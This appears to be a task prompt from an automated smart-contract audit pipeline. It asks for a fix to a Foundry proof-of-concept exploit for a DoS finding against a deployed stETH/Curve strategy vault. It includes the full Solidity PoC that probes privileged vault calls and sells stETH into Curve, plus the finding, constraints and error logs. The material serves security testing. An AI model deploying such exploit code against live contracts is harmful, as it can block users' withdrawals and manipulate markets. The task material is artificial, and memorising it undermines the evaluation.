You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Curve near-par minimum output plus swallowed divest reverts can permissionlessly DoS strategy exits
- claim: The strategy unwinds stETH through Curve with a near-par `min_dy` derived from the stETH input amount (`slippageBps` defaults to 10 bps), not from a live market quote. If the stETH/ETH pool moves beyond that threshold, Curve reverts. Vault withdrawals then silently convert that revert into a zero-asset divest because `AffineVault._divest()` catches all `strategy.divest()` failures and returns 0.
- impact: An attacker can front-run withdrawal, liquidation, rebalance, or strategy-removal transactions with a sufficiently large stETH->ETH trade, force the unwind swap to revert, and make the vault unable to source WETH from the strategy for that transaction. Organic stETH discounts can trigger the same failure mode, leaving capital temporarily stuck exactly when exits are needed.
- exploit_paths: ["Attacker or market movement pushes the stETH/ETH Curve execution price below the strategy's near-par `min_dy` threshold", "A vault withdrawal, liquidation, rebalance, or removal reaches `_endPosition()` or dec-leverage rebalancing and calls `CURVE.exchange(...)` with that stale threshold", "Curve reverts because actual ETH output is below `min_dy`", "`AffineVault._divest()` catches the revert and returns 0, so the vault cannot pull the requested WETH from the strategy"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStrategyLike {
    function vault() external view returns (address);
    function asset() external view returns (address);
    function divest(uint256 amount) external returns (uint256);
}

interface ICurvePoolLike {
    function exchange(int128 x, int128 y, uint256 dx, uint256 min_dy) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET_STRATEGY = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant CURVE = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    address internal _profitToken;
    uint256 internal _profitAmount;

    address public immutable strategy;
    address public discoveredVault;

    bool public executed;
    bool public strategyActiveInVault;
    bool public directDivestBlocked;
    bool public privilegedVaultExitBlocked;
    bool public privilegedRebalanceBlocked;
    bool public privilegedRemovalBlocked;
    bool public existingShareRouteAvailable;
    bool public curveManipulationAttempted;

    uint256 public verifierShareBalance;
    uint256 public verifierStEthBalance;
    uint256 public curveEthReceived;

    bytes public directDivestRevertData;
    bytes public vaultWithdrawRevertData;
    bytes public vaultRebalanceRevertData;
    bytes public vaultRemoveRevertData;
    bytes public vaultStrategyInfoData;
    bytes public vaultShareBalanceData;
    bytes public vaultRedeemProbeData;

    constructor() {
        strategy = TARGET_STRATEGY;
        _profitToken = _safeAsset(TARGET_STRATEGY);
    }

    function executeOnOpportunity() public {
        if (executed) {
            _updateProfit();
            return;
        }
        executed = true;

        discoveredVault = IStrategyLike(strategy).vault();
        verifierStEthBalance = IERC20Like(STETH).balanceOf(address(this));

        _probeStrategyRegistration();
        _probeShareBalance();

        // Path stage 2 requires reaching strategy.divest() through the vault.
        // A direct call from the verifier must fail if the deployed access control matches the source.
        (bool ok, bytes memory data) = strategy.call(abi.encodeWithSelector(IStrategyLike.divest.selector, 1));
        if (!ok) {
            directDivestBlocked = true;
            directDivestRevertData = data;
        }

        // Withdrawal/liquidation path in AffineVault uses withdrawFromStrategy(), but that entrypoint is privileged.
        (ok, data) = discoveredVault.call(abi.encodeWithSignature("withdrawFromStrategy(address,uint256)", strategy, 1));
        if (!ok) {
            privilegedVaultExitBlocked = true;
            vaultWithdrawRevertData = data;
        }

        // Rebalance path in AffineVault is also privileged.
        (ok, data) = discoveredVault.call(abi.encodeWithSignature("rebalance()"));
        if (!ok) {
            privilegedRebalanceBlocked = true;
            vaultRebalanceRevertData = data;
        }

        // Strategy removal path is governance-only in AffineVault.
        (ok, data) = discoveredVault.call(abi.encodeWithSignature("removeStrategy(address)", strategy));
        if (!ok) {
            privilegedRemovalBlocked = true;
            vaultRemoveRevertData = data;
        }

        // direct_or_existing_balance_first:
        // The hypothesis requires both:
        // 1. a stETH -> ETH sell to worsen Curve execution; and
        // 2. a same-tx reachable exit path that hits vault divest logic.
        //
        // If the verifier does not already hold vault shares on the fork, it cannot trigger a user withdrawal path
        // without adding a new economic leg. Depositing flash-loaned WETH into the vault would only create the
        // verifier's own redeemable position and does not convert this DoS into attacker profit.
        if (verifierShareBalance > 0) {
            existingShareRouteAvailable = true;

            if (verifierStEthBalance > 0) {
                curveManipulationAttempted = true;

                // Path stage 1: use only verifier-held stETH to push stETH/ETH price down before the exit attempt.
                IERC20Like(STETH).approve(CURVE, verifierStEthBalance);
                try ICurvePoolLike(CURVE).exchange(int128(1), int128(0), verifierStEthBalance, 0) returns (
                    uint256 ethReceived
                ) {
                    curveEthReceived = ethReceived;
                } catch {}
            }

            // Standard ERC4626-style redeem probe. If the live vault is redeemable by this contract with pre-existing
            // shares, the harness can observe whether the withdrawal path becomes reachable on fork state.
            (ok, data) = discoveredVault.call(
                abi.encodeWithSignature("redeem(uint256,address,address)", verifierShareBalance, address(this), address(this))
            );
            vaultRedeemProbeData = data;

            if (ok) {
                _updateProfit();
                return;
            }
        }

        _updateProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _updateProfit() internal {
        address token = _profitToken;
        if (token == address(0)) {
            _profitAmount = address(this).balance;
        } else {
            _profitAmount = IERC20Like(token).balanceOf(address(this));
        }
    }

    function _safeAsset(address target) internal view returns (address assetToken) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSignature("asset()"));
        if (ok && data.length >= 32) {
            assetToken = abi.decode(data, (address));
        }
    }

    function _probeStrategyRegistration() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("strategies(address)", strategy));
        vaultStrategyInfoData = data;

        if (ok && data.length >= 96) {
            (bool isActive,,) = abi.decode(data, (bool, uint16, uint232));
            strategyActiveInVault = isActive;
        }
    }

    function _probeShareBalance() internal {
        (bool ok, bytes memory data) =
            discoveredVault.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
        vaultShareBalanceData = data;

        if (ok && data.length >= 32) {
            verifierShareBalance = abi.decode(data, (uint256));
        }
    }

    receive() external payable {}
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: _endposition(), curve.exchange(...), affinevault._divest(); generated code does not cover paths indexes: 3
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
